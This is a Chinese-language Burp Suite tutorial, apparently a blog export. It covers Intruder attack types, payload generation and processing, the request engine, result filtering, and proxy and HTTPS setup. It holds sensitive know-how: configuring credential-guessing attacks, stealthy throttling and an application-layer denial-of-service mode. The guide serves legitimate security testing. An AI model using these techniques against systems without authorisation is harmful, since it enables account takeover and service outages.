位置标记被移除，并在它们之间出现在模板中任何封闭文本保持不变。这种攻击类型为个别模糊测试的一些请求参数常见的漏洞非常有用。在攻击中生成的请求的总数是位置的数目和在有效载荷中设定的有效载荷的数量的乘积。\n\nBattering ram(撞击物) - 使用一组payload。通过迭代的有效载荷方式，并将相同的payloads再一次填充到所有已定义的有效载荷仓。当其中一个攻击需要相同的输入将被插入在多个地方在请求中（例如，一个Cookie中的用户名和cookie参数）对这种攻击类型是非常有用的。在攻击中生成的请求的总数是有效载荷的有效载荷中设定的数目。\n\n![Image111](https://wooyun.js.org/images_result/images/2014101711121992842.png \"image111.png\")\n\n![Image113](https://wooyun.js.org/images_result/images/2014101711121957831.png \"image113.png\")\n\n例如生成一组数字1-9，则就是1-1 ，2-2，3-3这种形式 Pitchfork(相交叉) - 这将使用多个payloads集。有对每个定义的位置（最多20个）不同的有效载荷组。通过设置所有有效载荷的攻击迭代的方式，并将一个有效载荷到每个定义的位置。\n\n![Image115](https://wooyun.js.org/images_result/images/2014101711122127325.png \"image115.png\")\n\n![Image117](https://wooyun.js.org/images_result/images/2014101711122150222.png \"image117.png\")\n\n例如设置多个，每个payload设置一个字典，则就是1-1-1，2-2-2，3-3-3这种形式\n\n换句话说，第一个请求将放置第一个有效载荷的Payload set 1到Positions 1 ，并从有效载荷中的第一个Payload set 2到Positons 2 ;第二个请求将放置第二个Payload set 1到Positions 1 ，并从payload中的第二个Payload set 2到Postions2 ，等在那里的攻击需要不同但相关的输入进行插在多个地方，这种攻击类型是有用的请求（例如，用户名中的一个参数，和对应于该用户名中的另一个参数已知的ID号） 。在攻击中生成的请求的总数是有效载荷中的最小有效载荷组的数目。\n\nCluster bomb(集束炸弹) - 使用多个Payload sets。有对每个定义的Positions（最多20个）设置不同的payload set。通过每个有效载荷的攻击迭代依次设置，使有效载荷组合的所有排列进行测试。\n\n例如设置三个字典都是10个数，则总共有1000总匹配的模式\n\n![Image119](https://wooyun.js.org/images_result/images/2014101711122189353.png \"image119.png\")\n\n也就是说，如果有两个有效载荷的位置，则该攻击将放置第一个有效载荷从payload set 2到Positions 2 ，并通过在有效负载的所有 payload set 1中的positions 1 ;然后它将第二个有效载荷从载荷设置2到位置2 ，并通过有效载荷全部载入循环设置1到位置1 。其中一个攻击需要不同的和无关的或未知输入要在多个地方插入这种类型的攻击是非常有用的在请求中（例如猜测凭证，在一个参数的用户名，并且在另一个参数密码时） 。在攻击中生成的请求的总数是在所有定义的有效载荷的有效载荷集的数目的乘积 - 这可能是非常大的。\n\n## Payloads\n\n### Types\n\nBurp Intruder包含以下几种attack type:\n\n```\nSimple list--简单字典\nRuntime file--运行文件\nCustom iterator--自定义迭代器\nCharacter substitution--字符替换\n```\n\n此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。 用户界面允许您配置了一些字符替换。当执行攻击，有效载荷类型工程通过逐一配置的列表项。对于每个项目，它产生一个数的有效载荷，根据所定义的取代基包括取代的字符的所有排列。例如，默认替换规则（其中包括e>3且t>7），该项目“peter”将产生以下的有效载荷：\n\n```\npeter\np3ter\npe7er\np37er\npet3r\np3t3r\npe73r\np373r\n```\n\nCase modification--此负载类型允许您配置一个字符串列表，并应用各种情况下修改每个项目。这可能是密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。 可以选择以下的情况下修改规则：\n\n```\nNo change - 这个项目可以用不被修改。 \nTo lower case- 在该项目的所有字母转换为小写。 \nTo upper case - 在该项目的所有字母转换为大写。 \nTo Propername - 在该项目的第一个字母转换为大写，以及随后的字母转换为小写。 \nTo ProperName - 在该项目的第一个字母转换为大写，以及随后的字母都不会改变。\n```\n\n例如：\n\n```\nPeter Wiener\npeter wiener\nPETER WIENER\nPeter wiener\n```\n\n选项：\n\n```\nRecursive grep--递归grep\nIllegal Unicode--非法的Unicode\nCharacter blocks--字符块\nNumbers--数字\nDates--日期\nBrute forcer--暴力\nNull payloads--空的有效负载\nCharacter frobber--性格frobber\nBit flipper--位翻转\nUsername generator--用户名生成器\nECB block shuffler--欧洲央行座洗牌\nExtension-generated--扩展生成\nCopy other payload--复制其它有效负载\n```\n\n### Processing\n\n由配置的有效载荷类型生成的有效载荷可以使用各种有效载荷的处理规则和有效负载编码可以进一步操纵。\n\n#### 1)Payload Processing Rules\n\n在它被使用之前可以定义规则来对每个有效载荷执行各种处理任务。该定义的规则按顺序执行，并且可以打开和关闭，以帮助调试与配置的任何问题。有效载荷的处理规则是有用的在多种情况下，你需要生成不同寻常的有效载荷，或者需要在一个更广泛的结构或在使用前编码方案包的有效载荷可达。\n\n![Image121](https://wooyun.js.org/images_result/images/2014101711122171902.png \"image121.png\")\n\n```\nAdd prefix - 添加一个文字前缀\nAdd suffix - 添加一个文字后缀\nMatch/replace - 将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。\nSubstring - 提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。\nReverse substring - 对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。\nModify case - 这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型。\nEncode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台：采用不同的计划，该编码的有效载荷。\nHash - hash\nAdd raw payload - 这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。\nSkip raw payload - 将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。\nInvoke Burp extension - 调用一个Burp exxtension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以从已注册的当前加载的扩展可用的处理器列表中选择所需的处理器。\n```\n\n是规则的以下类型：\n\n#### 2)Payload Encoding\n\n你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。...\n\n### Optins\n\n此选项卡包含了request headers，request engine，attack results ，grep match，grep\\_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。\n\n#### Request Headers\n\n这些设置控制在攻击Intruder(入侵者)是否更新配置请求头。请注意，您可以完全控制请求头通过在Payload positions(有效载荷位置)标签的要求范围内。这些选项可以用来更新每个请求的报头的方式，通常是有帮助的。\n\n下列选项可用：\n\nUpdate Content-length header(更新Content-Length头) - 此选项使Intruder(入侵者)添加或更新的Content-Length头的每个请求，与该特定请求的HTTP体的长度正确的值。此功能通常用于该插入可变长度的有效载荷送入模板的HTTP请求的主体的攻击至关重要。如果未指定正确的值，则目标服务器可能会返回一个错误，可能不完全响应请求，或者可能无限期地等待在请求继续接收数据。\n\nSet Connection:close(设置连接：关闭) - 此选项使Intruder(入侵者)添加或更新连接头的值为“close(关闭)” 。在某些情况下（当服务器本身并不返回一个有效的Content-Length或Transfer-Encoding头） ，这个选项可以让攻击更快速地执行。\n\n#### Request Engine\n\n设置控制用于发出HTTP请求中的Intruder(入侵者)攻击的Engine(引擎)。下列选项可用：\n\n```\nNumber of threads(执行进程数) - [专业版]该选项控制并发请求数的攻击。\nNumber of retries on network failure(网络故障的重试次数) - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\nPause before retry(重试前暂停) - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位） ，然后重试失败以下。如果服务器被宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。\nThrottle between requests(请求之间的节流) - Burp可以在每次请求之前等待一个指定的延迟（以毫秒为单位） 。此选项很有用，以避免超载应用程序，或者是更隐蔽。或者，您可以配置一个可变延迟（与给定的初始值和增量） 。这个选项可以是有用的测试应用程序执行的会话超时时间间隔。\nStart time(开始时间) - 此选项允许您配置攻击立即启动，或在指定的延迟后，或开始处于暂停状态。如果攻击被配置，将在未来的某个时刻以供将来使用被执行，或保存这些替代品可能是有用的。\n```\n\n小心使用这些选项可让您微调攻击引擎，这取决于对应用程序性能的影响，并在自己的处理能力和带宽。如果您发现该攻击运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，使你的攻击进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。\n\n#### Attack Results\n\n这些设置控制哪些信息被捕获的攻击效果。下列选项可用：\n\n```\nStore requests/responses(存储请求/响应) - 这些选项确定攻击是否会保存单个请求和响应的内容。保存请求和响应占用磁盘空间，在你的临时目录中，但可以让您在攻击期间在众目睽睽这些，如果有必要重复单个请求，并将其发送到其他Burp工具。\nMake unmodified baseline request(未修改的基本请求) - 如果选择此选项，那么除了配置的攻击请求，Burp会发出模板请求设置为基值，所有有效载荷的位置。此请求将在结果表显示为项目＃ 0 。使用此选项很有用，提供一个用来比较的攻击响应基地的响应。\nUse denial-of-service mode(使用拒绝服务的模式) - 如果选择此选项，那么攻击会发出请求，如正常，但不会等待处理从服务器收到任何答复。只要发出的每个请求， TCP连接将被关闭。这个功能可以被用来执行拒绝服务的应用层对脆弱的应用程序的攻击，通过重复发送该启动高负荷任务的服务器上，同时避免通过举办开放套接字等待服务器响应锁定了本地资源的请求。\nStore full payloads(保存完整的有效载荷) - 如果选择此选项，Burp将存储全部有效载荷值的结果。此选项会占用额外的内存，但如果你想在运行时执行某些操作，如修改payload grep setting(有效负载值设置)，或重新发出请求与修改请求模板可能需要。\n```\n\n#### Grep-Match\n\n设置可用于包含在响应中指定的表达式标志结果的项目。对于配置列表中的每个项目，Burp会添加一个包含一个复选框，指出项目是否被发现在每个响应的新成果列。然后，您可以到组排序此列（通过单击列标题）匹配的结果相加。\n\n使用此选项可以是非常强大的，帮助分析大套的成绩，并迅速找出有趣的项目。例如，在口令猜测攻击，扫描短语，如“password incorrect(密码不正确)”或“login successful(登录成功)”，可以找到成功登录;在测试SQL注入漏洞，扫描含有“ ODBC ” ， “error(错误)”等消息可以识别易受攻击的参数。\n\n除了表达式匹配的列表，下列选项可用：\n\n```\nMatch(匹配类型) - 指定的表达式是否是简单的字符串或regular expressions(正则表达式)。\nCase sensitive match(区分大小写的匹配) - 指定检查表达式是否应区分大小写。\nExclude HTTP headers(不包括HTTP头) - 指定的HTTP响应头是否应被排除在检查。\n```\n\n#### Grep-Extrack\n\n可以被用来Extrack(提取)从反应有用的信息进入攻击结果的表。对于配置列表中的每个项目，Burp会添加一个包含提取该项目的文本的新成果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。例如我要匹配\n\n![Image123](https://wooyun.js.org/images_result/images/2014101711122144357.png \"image123.png\")\n\ninformation\\_schema这个表。则可以这样写，都是需要匹配唯一的那种，也可以使用正则，前提是你会写正则。在乌云社区有人提起过当时怎么匹配手机号，就可以从这里提取。\n\n![Image125](https://wooyun.js.org/images_result/images/2014101711122149847.png \"image125.png\")\n\n#### Grep-Payloads\n\n设置可用于含有所提交的有效载荷的反射标志的结果项。如果启用该选项，Burp会添加一个包含一个复选框，指示当前负载的值是否被发现在每个响应的新成果列。 （如果使用一个以上的有效载荷，单独的列将每个有效载荷集加。 ）\n\n此功能可以在检测跨站点脚本和其他应对注入漏洞，它可以出现在用户输入动态地插入到应用程序的响应是有用的。\n\n下列选项可用：\n\n```\nCase sensitive match(区分大小写的匹配) - 指定检查payload(负载)是否应区分大小写。\nExclude HTTP headers(不包括HTTP头) - 这指定的HTTP响应头是否应被排除在检查。\nMatch against pre-URL-encoded payloads(对预URL编码的有效载荷匹配) - 这是正常的配置Inturder(入侵者)请求中URL编码的有效载荷。然而，这些通常是由应用程序解码，回荡在他们的原始形式。您可以使用此选项，以用于有效载荷Burp检查反应在他们的预编码形式。\n```\n\n#### Redirections\n\n控制Burp在进行攻击时如何处理重定向。它往往是要遵循重定向来实现你的攻击目标。例如，在一个口令猜测攻击，每一次尝试的结果可能只能通过下面的重定向显示。模糊测试的时候，相关的反馈可能只出现在最初的重定向响应后返回的错误消息。\n\n下列选项可用： Follow redirections(跟随重定向) - 控制重定向都遵循的目标。下列选项可用：\n\n```\n1)Never(从来没有) - 入侵者不会遵循任何重定向。\n2)On-site only(现场唯一的) - 入侵者只会跟随重定向到同一个网页“网站” ，即使用相同的主机，端口和协议的是在原始请求使用的URL 。\n3)In-scope only(调查范围内的唯一) - Intruder只会跟随重定向到该套件范围的目标范围之内的URL 。\n4)Always(总是) - Intruder将遵循重定向到任何任何URL 。您应使用此选项时应谨慎 - 偶尔， Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击。\n```\n\nProcess cookies in redirections(过程中的Cookie重定向) - 如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。例如，如果你正在尝试暴力破解登录的挑战就可能是必要的，它总是返回一个重定向到一个页面显示登录的结果，和一个新的会话响应每个登录尝试创建。\n\nBurp会跟进到10链重定向，如果必要的。在结果表中的列将显示重定向是否其次为每个单独的结果，以及完整的请求和响应中的重定向链存储与每个结果的项目。重定向的类型Burp会处理（ 3xx的状态码，刷新头，等）配置在一套全重定向选项。\n\n注意重定向： 在某些情况下，可能需要下面的重定向时只使用一个单线程的攻击。出现这种情况时，应用程序存储会话中的初始请求的结果，并提供重定向响应时检索此。\n\n自动下重定向有时可能会造成问题 - 例如，如果应用程序响应一个重定向到注销页面的一些恶意的请求，那么下面的重定向可能会导致您的会话被终止时，它原本不会这么做。\n\n### Attacks\n\n当你配置完你的攻击设置时，你需要launch the attacks(发起攻击)，analyze the results(分析结果)，有时修改攻击配置，与您的测试工作流程链接，或进行其他操作。\n\n#### Launching an Attack\n\n攻击可以通过两种方式启动：\n\n```\n1)您可以配置Target(目标)，Positions(位置)，Payloads(有效载荷)和Options(选项卡)的攻击设置，然后选择从Intruder(入侵者)菜单“Start attack(开始攻击)”。 \n2)您可以通过从Intruder menu(入侵者菜单)中选择“previously saved attack(打开保存的攻击)”打开以前保存的攻击。 \n```\n\n在单独的窗口中每次攻击会打开。该窗口显示攻击为它们生成的结果，使您能够修改攻击配置实时，并与您的测试工作流程链接，或进行其他操作。\n\n#### Result Tab\n\n在结果选项卡包含在攻击发出的每个请求的全部细节。你可以过滤并标注此信息来帮助分析它，并使用它来驱动您的测试工作流程。\n\n#### 1)Results Table\n\nResults Table显示已在attack中所有的请求和响应的详细信息。根据不同的攻击配置，表可能包含以下几列，其中一些是默认隐藏的，可以使用Columns菜单 中取消隐藏：\n\n![Image127](https://wooyun.js.org/images_result/images/2014101711122190859.png \"image127.png\")\n\n![Image129](https://wooyun.js.org/images_result/images/2014101711122295512.png \"image129.png\")\n\nrequest 请求数 Position 有效载荷位置编号 Payload 有效载荷 Status http状态 Error 请求错误 Timeout 超时 Length 字节数 Comment 注释\n\n#### 2)Display Filter\n\n结果选项卡，可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容显示过滤在结果表中。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\n![Image131](https://wooyun.js.org/images_result/images/2014101711122263054.png \"image131.png\")\n\n```\nSearch term(检索词) - [专业版]您可以筛选反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“negative search(消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。\nStatus code(状态代码) - 您可以配置是否要显示或隐藏各种HTTP状态码响应。\nAnnotation(注释) - 您可以设定是否显示使用用户提供的评论或只重点项目。在结果表中显示的内容实际上是一个视图到基础数据库，并显示过滤器控制什么是包含在该视图。如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究一个大的结果集（例如，从模糊测试包含许多参数的要求）来理解各种不同的有趣的响应出现。\n```\n\n### Attack configuration Tabs\n\n在结果选项卡中，攻击窗口包含每个从它目前的攻击是基于主界面的配置选项卡中的克隆。这使您能够查看和修改攻击配置，同时进攻正在进行中。有关进一步详情，请参阅各配置选项卡的帮助：目标职位有效载荷选项当修改一个跑动进攻的配置，以下几点值得关注：攻击结构的某些部分是基本的攻击（如攻击类型和有效载荷类型）的结构，并且攻击已经开始之后不能改变。改变配置的某些部分攻击正在运行时，可能会有意想不到的效果。\n\n例如，如果您使用的是数量的有效载荷和编辑字段中，然后更改才会生效，因为每个键被按下;如果你最初从删除数字字段中，那么攻击可能会突然完成，因为要字段现在包含一个较小的数字。我们强烈建议您暂停修改它们的配置运行前的攻击。\n\n### Result Menus\n\n结果视图包含几个菜单命令与控制的攻击，并进行其他操作。这些将在下面说明。\n\n![Image133](https://wooyun.js.org/images_result/images/2014101711122362902.png \"image133.png\")\n\n![Image135](https://wooyun.js.org/images_result/images/2014101711122330940.png \"image135.png\")\n\n#### 1)Attack Menu(攻击菜单)\n\n包含的命令pause(暂停)，resume(继续)或repeat(重复)攻击。\n\n#### 2）Save Menu(保存菜单)\n\n```\nattack - 这是用来保存当前攻击的副本，包括结果。保存的文件可以使用从主Burp的UI Intruder菜单中的“打开保存的攻击”选项来重新加载。\nResults table - 这是用于对结果表保存为一个文本文件。你可以选择保存的所有行，或仅选定的行。您也可以选择要包括的列，列分隔符。此功能是有用的导出结果到电子表格中，以便进一步分析，或用于保存单个列（如使用提取的grep函数挖掘数据），以用作用于随后的攻击或其它工具的输入文件。\nServer responses - 这是用于保存收到的所有请求的全部应答。这些既可以被保存在单独的文件中（顺序编号）或串行级联的序列转换成一个单一的文件。\nAttack configuration - 这是用来保存当前正在执行攻击的配置（而不是结果）。您可以重新使用从主Burp的UI Intruder菜单中的“加载配置攻击”选项，攻击配置。\n```\n\n#### 3)Columns Menu(列菜单)\n\n这使您可以选择哪些可用的列是可见的攻击结果表。\n</style>","slug":"Suite使用介绍（一）","published":1,"layout":"post","photos":[],"_id":"cm8iuwsr80009rcn1gfe6cqnp","content":"<hr>\n<p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。本文主要介绍它的以下特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.Target(目标)——显示目标目录结构的的一个功能</span><br><span class=\"line\">2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</span><br><span class=\"line\">3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</span><br><span class=\"line\">4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</span><br><span class=\"line\">5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</span><br><span class=\"line\">6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</span><br><span class=\"line\">7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</span><br><span class=\"line\">8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</span><br><span class=\"line\">9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</span><br><span class=\"line\">10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</span><br><span class=\"line\">11.Options(设置)——对Burp Suite的一些设置</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h2 id=\"测试工作流程\"><a href=\"#测试工作流程\" class=\"headerlink\" title=\"测试工作流程\"></a>测试工作流程</h2><p>Burp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 让我们一起来看看Burp Suite的测试流程过程吧。 如下图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120074380.png\" alt=\"Image001\" title=\"image001.png\"></p>\n<h2 id=\"简要分析\"><a href=\"#简要分析\" class=\"headerlink\" title=\"简要分析\"></a>简要分析</h2><p>代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动，在一个典型的测试中，侦察和分析阶段包括以下任务：</p>\n<p>手动映射应用程序-使用浏览器通过BurpSuite代理工作，手动映射应用程序通过以下链接，提交表单，并通过多步骤的过程加强。这个过程将填充代理的历史和目标站点地图与所有请求的内容，通过被动蜘蛛将添加到站点地图，可以从应用程序的响应来推断任何进一步的内容(通过链接、表单等)。也可以请求任何未经请求的站点(在站点地图中以灰色显示的)，并使用浏览器请求这些。</p>\n<p>在必要是执行自动映射-您可以使用BurpSuite自动映射过程中的各种方法。可以进行自动蜘蛛爬行，要求在站点地图未经请求的站点。请务必在使用这个工具之前，检查所有的蜘蛛爬行设置。</p>\n<p>使用内容查找功能发现，可以让您浏览或蜘蛛爬行可见的内容链接以进一步的操作。</p>\n<p>使用BurpSuite Intruder(入侵者)通过共同文件和目录列表执行自定义的发现，循环，并确定命中。</p>\n<p>注意，在执行任何自动操作之前，可能有必要更新的BurpSuite的配置的各个方面，诸如目标的范围和会话处理。</p>\n<p>分析应用程序的攻击面 - 映射应用程序的过程中填入代理服务器的历史和目标站点地图与所有的BurpSuite已抓获有关应用程序的信息。这两个库中包含的功能来帮助您分析它们所包含的信息，并评估受攻击面的应用程序公开。此外，您可以使用BurpSuite的目标分析器报告的攻击面的程度和不同类型的应用程序使用的URL 。</p>\n<p>接下来主要介绍下BurpSuite的各个功能吧。先介绍Proxy功能，因为Proxy起到一个心脏功能，所有的应用都基于Proxy的代理功能。</p>\n<h2 id=\"Burp-Suite功能按钮键翻译对照\"><a href=\"#Burp-Suite功能按钮键翻译对照\" class=\"headerlink\" title=\"Burp Suite功能按钮键翻译对照\"></a>Burp Suite功能按钮键翻译对照</h2><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>### 导航栏</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Burp</td>\n<td>BurpSuite</td>\n<td>save state wizard</td>\n<td>保存状态向导</td>\n</tr>\n<tr>\n<td>restore state</td>\n<td>恢复状态</td>\n<td>Remember setting</td>\n<td>记住设置</td>\n</tr>\n<tr>\n<td>restore defaults</td>\n<td>恢复默认</td>\n<td>Intruder</td>\n<td>入侵者</td>\n</tr>\n<tr>\n<td>Start attack</td>\n<td>开始攻击(爆破)</td>\n<td>Actively scan defined insertion points</td>\n<td>定义主动扫描插入点</td>\n</tr>\n<tr>\n<td>Repeater</td>\n<td>中继器</td>\n<td>New tab behavior</td>\n<td>新标签的行为</td>\n</tr>\n<tr>\n<td>Automatic payload positions</td>\n<td>自动负载位置</td>\n<td>config predefined payload lists</td>\n<td>配置预定义的有效载荷清单</td>\n</tr>\n<tr>\n<td>Update content-length</td>\n<td>更新内容长度</td>\n<td>unpack gzip&#x2F;deflate</td>\n<td>解压gzip&#x2F;放弃</td>\n</tr>\n<tr>\n<td>Follow redirections</td>\n<td>跟随重定向</td>\n<td>process cookies in redirections</td>\n<td>在重定向过程中的cookies</td>\n</tr>\n<tr>\n<td>View</td>\n<td>视图</td>\n<td>Action</td>\n<td>行为</td>\n</tr>\n<tr>\n<td>### 功能项</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Target</td>\n<td>目标</td>\n<td>Proxy</td>\n<td>代理</td>\n</tr>\n<tr>\n<td>Spider</td>\n<td>蜘蛛</td>\n<td>Scanner</td>\n<td>扫描</td>\n</tr>\n<tr>\n<td>Intruder</td>\n<td>入侵者</td>\n<td>Repeater</td>\n<td>中继器</td>\n</tr>\n<tr>\n<td>Sequencer</td>\n<td>定序器</td>\n<td>Decoder</td>\n<td>解码器</td>\n</tr>\n<tr>\n<td>Comparer</td>\n<td>比较器</td>\n<td>Extender</td>\n<td>扩展</td>\n</tr>\n<tr>\n<td>Options</td>\n<td>设置</td>\n<td>Detach</td>\n<td>分离</td>\n</tr>\n<tr>\n<td>Filter</td>\n<td>过滤器</td>\n<td>SiteMap</td>\n<td>网站地图</td>\n</tr>\n<tr>\n<td>Scope</td>\n<td>范围</td>\n<td>Filter by request type</td>\n<td>通过请求过滤</td>\n</tr>\n<tr>\n<td>Intercept</td>\n<td>拦截</td>\n<td>response Modification</td>\n<td>响应修改</td>\n</tr>\n<tr>\n<td>match and replace</td>\n<td>匹配和替换</td>\n<td>ssl pass through</td>\n<td>SSL通过</td>\n</tr>\n<tr>\n<td>Miscellaneous</td>\n<td>杂项</td>\n<td>spider status</td>\n<td>蜘蛛状态</td>\n</tr>\n<tr>\n<td>crawler settings</td>\n<td>履带式设置</td>\n<td>passive spidering</td>\n<td>被动蜘蛛</td>\n</tr>\n<tr>\n<td>form submission</td>\n<td>表单提交</td>\n<td>application login</td>\n<td>应用程序登录</td>\n</tr>\n<tr>\n<td>spider engine</td>\n<td>蜘蛛引擎</td>\n<td>scan queue</td>\n<td>扫描队列</td>\n</tr>\n<tr>\n<td>live scanning</td>\n<td>现场扫描</td>\n<td>live active scanning</td>\n<td>现场主动扫描</td>\n</tr>\n<tr>\n<td>live passive scanning</td>\n<td>现场被动扫描</td>\n<td>attack insertion points</td>\n<td>攻击插入点</td>\n</tr>\n<tr>\n<td>active scanning optimization</td>\n<td>主动扫描优化</td>\n<td>active scanning areas</td>\n<td>主动扫描区域</td>\n</tr>\n<tr>\n<td>passive scanning areas</td>\n<td>被动扫描区域</td>\n<td>Payload</td>\n<td>有效载荷</td>\n</tr>\n<tr>\n<td>payload processing</td>\n<td>有效载荷处理</td>\n<td>select live capture request</td>\n<td>选择现场捕获请求</td>\n</tr>\n<tr>\n<td>token location within response</td>\n<td>内响应令牌的位置</td>\n<td>live capture options</td>\n<td>实时捕捉选项</td>\n</tr>\n<tr>\n<td>Manual load</td>\n<td>手动加载</td>\n<td>Analyze now</td>\n<td>现在分析</td>\n</tr>\n<tr>\n<td>Platform authentication</td>\n<td>平台认证</td>\n<td>Upstream proxy servers</td>\n<td>上游代理服务器</td>\n</tr>\n<tr>\n<td>Grep Extrack</td>\n<td>提取</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"Proxy功能\"><a href=\"#Proxy功能\" class=\"headerlink\" title=\"Proxy功能\"></a>Proxy功能</h1><hr>\n<p>Burp Proxy相当于BurpSuite的心脏，通过拦截，查看和修改所有的请求和响应您的浏览器与目标Web服务器之间传递。 下面了解有关BurpProxy：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120067021.png\" alt=\"Image003\" title=\"image003.png\"></p>\n<h2 id=\"Using-BurpProxy-http、https\"><a href=\"#Using-BurpProxy-http、https\" class=\"headerlink\" title=\"Using BurpProxy http、https\"></a>Using BurpProxy http、https</h2><h3 id=\"http\"><a href=\"#http\" class=\"headerlink\" title=\"http\"></a>http</h3><p>设置代理的方法：以http ie为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">工具&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;局域网&gt;&gt;勾选代理服务器填写地址127.0.0.1端口8080</span><br></pre></td></tr></table></figure>\n\n<p>这里端口可以随便定义但是要跟burp的监听端口要一致然后保存再到Proxy的Options中添加add</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120062713.jpg\" alt=\"Image005\" title=\"image005.jpg\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120053086.jpg\" alt=\"Image007\" title=\"image007.jpg\"></p>\n<p>这样http协议的监听就可以了,当intercept is on表示开启拦截功能，反之</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120574272.jpg\" alt=\"Image009\" title=\"image009.jpg\"></p>\n<p>这样就代表拦截成功，我们可以右击send to Repeater去修改数据再发送，也可以右击改变提交请求方式(change request method)比如get或者post等功能</p>\n<h3 id=\"https\"><a href=\"#https\" class=\"headerlink\" title=\"https\"></a>https</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.以管理员权限运行ie浏览器</span><br><span class=\"line\">2.像http那样配置好代理 </span><br><span class=\"line\">3.在地址栏访问https地址，单击继续 </span><br><span class=\"line\">4.点击错误证书在这个地址栏 </span><br><span class=\"line\">5.点击查看证书 </span><br><span 